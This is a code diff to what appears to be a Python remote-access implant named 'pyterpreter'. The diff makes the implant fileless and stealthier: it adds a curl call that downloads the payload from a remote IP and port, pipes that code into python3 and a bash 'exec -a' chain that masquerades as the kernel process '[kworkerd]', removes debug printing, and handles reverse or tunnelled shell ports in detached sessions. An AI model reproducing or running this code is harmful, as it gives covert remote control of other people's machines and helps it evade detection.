@@ -13,11 +13,9 @@ import tempfile
 
 
 PROCESS_NAME = '[kworkerd]'
-DEBUG = False
 
 
 class EnvKeys:
-    FILE = 'FILE'
     LAYER = 'LAYER'
     NO_RESTART = 'NO_RESTART'
     OPEN_SHELL_CLASSIC_PORT = 'OPEN_SHELL_CLASSIC_PORT'
@@ -29,21 +27,25 @@ class EnvKeys:
 
 
 class Env:
-    file = os.environ.get(EnvKeys.FILE, __file__)
     layer = int(os.environ.get(EnvKeys.LAYER, '0'))
     no_restart = bool(os.environ.get(EnvKeys.NO_RESTART))
     open_shell_classic_port = os.environ.get(EnvKeys.OPEN_SHELL_CLASSIC_PORT, None)
     open_shell_tunneled_conversation_uid = os.environ.get(EnvKeys.OPEN_SHELL_TUNNELED_CONVERSATION_UID, None)
     pyterpreter = 'YEET'
-    remote_ip = os.environ.get(EnvKeys.REMOTE_IP, 'localhost')
-    remote_port = int(os.environ.get(EnvKeys.REMOTE_PORT, 50000))
-    resources_port = int(os.environ.get(EnvKeys.RESOURCES_PORT, 1338))
+    remote_ip: str
+    remote_port: int
+    resources_port: int
+
+    @staticmethod
+    def initialise():
+        Env.remote_ip = os.environ[EnvKeys.REMOTE_IP]
+        Env.remote_port = int(os.environ[EnvKeys.REMOTE_PORT])
+        Env.resources_port = int(os.environ[EnvKeys.RESOURCES_PORT])
 
 
 class Process:
     @staticmethod
     def get_cmd_output(cmd: str, strip_new_line=False) -> [int, bytes]:
-        print(cmd)
         proc = subprocess.run(cmd, shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
         if strip_new_line and len(proc.stdout) > 0 and proc.stdout[-1] == b'\n'[0]:
             return proc.returncode, proc.stdout[:-1]
@@ -52,8 +54,7 @@ class Process:
 
     @staticmethod
     def spawn_self_with_env(env: dict):
-        subprocess.run(['python3', Env.file], env={**os.environ, **env}, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
+        subprocess.run(['python3'], env={**os.environ, **env}, input=Config.code, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
 class Message:
@@ -222,6 +223,11 @@ class MessageProcessor:
 
 class Config:
     username = Process.get_cmd_output('whoami', True)[1].decode()
+    code: bytes
+
+    @staticmethod
+    def initialise():
+        Config.code = Process.get_cmd_output(f'curl {Env.remote_ip}:{Env.resources_port}/pyterpreter.py')[1]
 
 
 def main_detached():
@@ -257,24 +263,20 @@ def main_detached():
 
 
 def main():
+    print(os.environ)
+    Env.initialise()
+    Config.initialise()
     if Env.layer == 0:
         os.environ[EnvKeys.LAYER] = '1'
         os.environ[EnvKeys.PYTERPRETER] = Env.pyterpreter
-        os.environ[EnvKeys.FILE] = __file__
-        child = subprocess.Popen(['python3', __file__], stdout=subprocess.PIPE)
-        grandchild_pid = child.stdout.readline().decode()[:-1]
-        print(f'Pyterpreter running at {grandchild_pid}')
-        if DEBUG:
-            try:
-                while True:
-                    pass
-            except KeyboardInterrupt:
-                os.system(f'kill {grandchild_pid}')
+        subprocess.run(['python3'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, input=Config.code)
     elif Env.layer == 1:
         os.environ[EnvKeys.LAYER] = '2'
         grand_child = subprocess.Popen(
             ['bash'],
             stdin=subprocess.PIPE,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
             start_new_session=True
         )
 
@@ -284,15 +286,9 @@ def main():
             process_name = PROCESS_NAME
         grand_child.stdin.write(f'exec -a {process_name} python3\n'.encode())
         grand_child.stdin.flush()
-        with open(__file__, 'rb') as fh:
-            grand_child.stdin.write(fh.read())
-            grand_child.stdin.write(b'\nmain()')
+        grand_child.stdin.write(Config.code)
+        grand_child.stdin.write(b'\nmain()')
         grand_child.stdin.close()
-        print(grand_child.pid, flush=True)
-        if DEBUG:
-            import time
-            time.sleep(10)
-
     else:
         os.environ[EnvKeys.LAYER] = '0'
         main_detached()
